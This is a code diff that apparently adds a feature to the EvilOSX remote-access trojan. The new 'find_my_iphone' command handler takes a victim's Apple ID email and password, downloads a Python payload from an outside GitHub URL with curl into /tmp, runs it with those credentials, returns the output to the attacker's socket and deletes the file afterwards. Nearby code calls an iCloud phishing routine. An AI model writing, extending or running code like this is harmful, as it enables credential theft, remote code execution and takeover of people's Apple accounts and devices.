@@ -371,6 +371,18 @@ def start_server():
                 output = icloud_phish(server_socket, email)
 
                 server_socket.sendall(output)
+            elif command.startswith("find_my_iphone"):
+                email = command.split(" ")[1]
+                password = command.split(" ")[2]
+
+                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/7841226b942a1b3a5e12007210f4e49ae962c1aa/Payloads/find_my_iphone.py"
+                payload_file = "/tmp/find_my_iphone.py"
+
+                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                output = execute_command("python {0} {1} {2}".format(payload_file, email, password), False)
+
+                server_socket.sendall(output)
+                execute_command("rm -rf {0}".format(payload_file))
             elif command == "kill_client":
                 server_socket.sendall("Farewell.")
                 kill_client(is_root())
